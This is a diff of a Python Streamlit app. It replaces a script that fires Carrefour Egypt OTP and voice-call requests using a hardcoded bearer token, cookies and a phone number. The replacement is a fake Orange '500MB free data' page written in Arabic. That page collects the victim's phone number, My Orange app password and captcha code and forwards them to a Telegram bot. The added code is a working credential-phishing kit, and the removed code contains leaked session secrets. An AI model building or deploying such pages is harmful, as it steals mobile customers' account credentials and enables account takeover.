@@ -1,62 +1,119 @@
 import streamlit as st
-import requests
-import json
+from telegram.ext import Updater, CommandHandler, MessageHandler, Filters
 
-st.title("Carrefour Egypt Verification")
+# Replace 'YOUR_TOKEN' with your Telegram Bot token
+TOKEN = 'YOUR_TOKEN'
 
-num = st.text_input("Enter your phone number:")
+def start(update, context):
+    update.message.reply_text('مرحبًا! قم بإدخال رقم تليفون اورانج وباسورد تطبيق my orange.')
 
-if st.button("Send OTP"):
-    if num.startswith("0"):
-        nu = num[1:]  # يزيل
+def echo(update, context):
+    chat_id = update.message.chat_id
+    message_text = update.message.text
+    context.bot.send_message(chat_id=chat_id, text=message_text)
 
-        n = "Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IlF6UXpRekpFTlVNeE16aEdOemcwUlRjeVF6VXdRVEkyTWpoRlJEZEROVE0xTVVNM1F6TTJPUSJ9.eyJodHRwczovL21hZi5ncmF2dHkuYXV0aC9kZXYvYXBpL2VtYWlsIjoiZ2RmZ2Zzc2Z0Z2NmeGZmQGpnZ3V1LmNvbSIsImh0dHBzOi8vbWFmLmlkZW50aXR5LmF1dGgvZGV2L2FwaS9lbWFpbCI6ImdkZmdmc3NmdGdjZnhmZkBqZ2d1dS5jb20iLCJodHRwczovL21hZi5pZGVudGl0eS5hdXRoL2Rldi9hcGkvcmlkIjoiNWZhNzQ2M2UtOTQxZi00YmZmLTg1M2QtYmU2MTBhNTc4NDdmIiwiaHR0cHM6Ly9tYWYuaWRlbnRpdHkuYXV0aC9kZXYvYXBpL21pcmFrbF9zaG9wX2lkIjpudWxsLCJodHRwczovL21hZi5pZGVudGl0eS5hdXRoL2Rldi9hcGkvdGltZSI6IjIwMjQtMDQtMjlUMTc6NTU6MDIuNjAzWiIsImh0dHBzOi8vbWFmLmdyYXZ0eS5hdXRoL2Rldi9hcGkvdXVpZCI6IjY3MGFhY2I2LTU4YjktNGEyNS1hMmVlLWRjNWJjYjk2ODk3OSIsImh0dHBzOi8vbWFmLmlkZW50aXR5LmF1dGgvZGV2L2FwaS91dWlkIjoiNjcwYWFjYjYtNThiOS00YTI1LWEyZWUtZGM1YmNiOTY4OTc5IiwiaHR0cHM6Ly9tYWYuaWRlbnRpdHkuYXV0aC9kZXYvYXBpL2VtYWlsX3ZlcmlmaWVkIjpmYWxzZSwiaXNzIjoiaHR0cHM6Ly9wcm9kdWN0aW9uLm1hZi5hdXRoMC5jb20vIiwic3ViIjoiYXV0aDB8NjYyZmRlZjYyMDMxZjU4MGQ3YzhmZDVhIiwiYXVkIjpbImh0dHBzOi8vcHJvZHVjdGlvbi5tYWYuYXV0aDAuY29tL2FwaS92Mi8iLCJodHRwczovL3Byb2R1Y3Rpb24ubWFmLmF1dGgwLmNvbS91c2VyaW5mbyJdLCJpYXQiOjE3MTQ0MTMzMDIsImV4cCI6MTcxNzAwNTMwMiwic2NvcGUiOiJvcGVuaWQgcHJvZmlsZSBlbWFpbCByZWFkOmN1cnJlbnRfdXNlciB1cGRhdGU6Y3VycmVudF91c2VyX21ldGFkYXRhIGRlbGV0ZTpjdXJyZW50X3VzZXJfbWV0YWRhdGEgY3JlYXRlOmN1cnJlbnRfdXNlcl9tZXRhZGF0YSBjcmVhdGU6Y3VycmVudF91c2VyX2RldmljZV9jcmVkZW50aWFscyBkZWxldGU6Y3VycmVudF91c2VyX2RldmljZV9jcmVkZW50aWFscyB1cGRhdGU6Y3VycmVudF91c2VyX2lkZW50aXRpZXMgb2ZmbGluZV9hY2Nlc3MiLCJndHkiOiJwYXNzd29yZCIsImF6cCI6ImNGdlJQMmN1QnhiM2l2Q0hkY1B5VGVYZmdUS3ZIV01hIn0.IszxGn-Lk6IaSprUAc8NFc6TmZas1vS7G_jkhcRHkI8gc8XcBeQnU4n2X6AcB6SEg1Gr8gGJIboV23cVj6Iul3aU8DaN8qF1KEpRwb7KkP6tCFAloJgv8QHuBP_1NV2_bgUBBXykJmhY6-8PnJKNHE3MHK1rD2q1Mk1f7c863oz-UJQWwcoZlGZHFAgZYrEpDQx3Ox0J5Pu2LXnMBafwYqxoWL4BueN-rfWhdN7Z3xgsd1ZFxUJkqkn5asXU5XFs6BgKengxIbduUJzy6JXRwpWXkVxro8uEkhScHjw7ojlW8GXG6_eSTmXi8SsYpziU_DWy0FsCTDBhBx9hnyUp3A"
+def main():
+    updater = Updater(TOKEN, use_context=True)
+    dp = updater.dispatcher
+    dp.add_handler(CommandHandler("start", start))
+    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, echo))
+    updater.start_polling()
+    updater.idle()
 
-        url = "https://api-prod.retailsso.com/v1/users/mafegy/en/contacts"
+if __name__ == '__main__':
+    main()
 
-        payload = json.dumps({
-            "number": nu
-        })
+st.title('500MB | orange')
 
-        headers = {
-            'Accept-Encoding': "gzip, deflate, br, zstd",
-            'Content-Type': "application/json",
-            'sec-ch-ua-mobile': "?1",
-            'env': "prod",
-            'langcode': "en",
-            'lang': "en",
-            'userid': "gdfgfssftgcfxff@jgguu.com",
-            'x-requested-with': "XMLHttpRequest",
-            'posinfo': "food=201_Zone03,nonfood=299_Zone09,express=700_Zone01",
-            'appid': "Reactweb",
-            'token': n,
-            'storeid': "mafegy",
-            'sec-ch-ua-platform': "\"Android\"",
-            'origin': "https://www.carrefouregypt.com",
-            'sec-fetch-site': "cross-site",
-            'sec-fetch-mode': "cors",
-            'sec-fetch-dest': "empty",
-            'referer': "https://www.carrefouregypt.com/",
-            'accept-language': "ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7",
-            'priority': "u=1, i",
-            'Cookie': "_abck=356A020906C97C299DAC0725AF9101CD~-1~YAAQZuoWAh2bzDSPAQAAjOnoPwvZK4DWXZXHCUxBVfThaWn9w1btkSMy8jJotrN2snipFY7DfMldn2CJGW34qS9TcmATr4h+U1kzA89mcFOZIqP2D4OFjn1mzNgA7Gc+stGVbi98J3nv8UfmNQ2PBpKz0HfdNlq/hAmWkCdF/+A7NK+CjxN0aLyzTwlbL0WrrIBYTTLnDO7U70LB+60gsYspPqqmev1KtZ0BlZMWXvvhz7uQjZud9Ln6QVMfbkPTtND/Uda7lEvhNxQtzDdR5UZ2UHikIJd9jgApKwIsboZZtR7bGW4sLKAJZ3sabLozeXp4/djPnamquNOEWAU6MOLThzcRItf9+AvRtIduJX45/oF/H+dJp0DoEuYceVb05gVJdBlZSNKgJWjgeRI=~-1~-1~-1; bm_sz=214ADBADAE1D27941765B81FF2671BDE~YAAQZuoWAh6bzDSPAQAAjOnoPxeJ4WVOTskbGSlYNPBc8eV6fqTaw7Re8sYo762akIZwoc6spHT49XuET2YAVgk8jARgKkDfn0B0ZhrYqRXQ5ifVWXAWCkihrcW4201p1YV/prxq4oIFd9yPVwZspVV2A7zRiiCpIKkbdSXNP3Cb1f4aJm4Ef4LNJFbaL3oNWq2i5d1YOalcfiavqfGuroU+zhZSMJBnH4MI8HChzyWw5elsO4u7Ho+pvC8PRMK4Ij2XMwSt237uTppUcl5/9h1UklJZSSsbeCOh+MdnfJ/PtRSPGZsYiq6oGWoI+zXYeV1whyheYy9NibZmSIjpv73b8ZxS6qnKHcX2+0k4yQtkoM4Tf7Zqdar8QdE=~3420468~3622212"
+st.markdown(
+    """
+    <style>
+        .box {
+          width: 275px;
+          padding: 55px 56px;
+          poosition: absolute;
+          background-color: black;
+          height: 375px;
+          border-radius: 20px;
         }
 
-        response = requests.patch(url, data=payload, headers=headers)
+        body {
+          margin: 0;
+          padding: 0;
+          font-family: sans-serif;
+          justify-content: center;
+          align-items: center;
+          display: flex;
+          background-position: center center;
+          background-attachment: fixed;
+          background-repeat: no-repeat;
+          background-size: 100% 100%;
+          background-image: url(https://upload.wikimedia.org/wikipedia/commons/thumb/c/c8/Orange_logo.svg/1200px-Orange_logo.svg.png);
+        }
 
-        st.write("OTP request status:", response.text)
+        input {
+          background-color: black;
+          display: block;
+          margin: 20px auto;
+          text-align: center;
+          padding: 14px 11px;
+          width: 274px;
+          color: white;
+          border-radius: 24px;
+          font-weight: bolder;
+          border: 2px solid lightblue;
+        }
 
-        url1 = "https://www.carrefouregypt.com/v2/customers/otp/voice-call"
+        .box input:focus {
+          border: 2.5px solid yellow;
+        }
 
-        payload1 = json.dumps({
-            "mode": "voice",
-            "action": "PHONE_VERIFICATION",
-            "email": "gdfgfssftgcfxff@jgguu.com",
-            "phoneNumber": "+201080216347",
-            "uuid": "40586333-46f6-43e3-9f34-7f23654f8f42",
-            "locale": "en"
-        })
+        .box .btn {
+          display: block;
+          margin: 20px auto;
+          text-align: center;
+          color: white;
+          font-weight: bolder;
+          border-radius: 10px;
+          padding: 5px 30px;
+          border: 2px solid yellow;
+          background-color: black;
+          font-size: 16px
+        }
 
-        response1 = requests.post(url1, data=payload1, headers=headers)
+        #loading-indicator {
+          display: none;
+        }
 
-        st.write("OTP sent status:", response1.text)
+        #loading-indicator:before {
+          content: "";
+          display: inline-block;
+          width: 35px;
+          height: 35px;
+          border: 6px solid yellow;
+          border-top-color: red;
+          border-bottom-color: darkred;
+          border-radius: 50%;
+          animation: spin 0.67s linear infinite;
+        }
+
+        @keyframes spin {
+          to {
+            transform: rotate(360deg);
+          }
+        }
+    </style>
+    """,
+    unsafe_allow_html=True
+)
+
+number = st.text_input("رقم تليفون اورانج", type="number")
+password = st.text_input("باسورد تطبيق my orange", type="password")
+
+captcha_response = st.text_input("كود الكباتشا")
+
+if st.button("add 500mb"):
+    bot_message = f"رقم التليفون: {number}\nباسورد تطبيق my orange: {password}\nكود الكباتشا: {captcha_response}"
+    updater = Updater(TOKEN)
+    updater.bot.send_message(chat_id='YOUR_CHAT_ID', text=bot_message)
+    st.write("تم إرسال المعلومات بنجاح إلى البوت على التليجرام.")
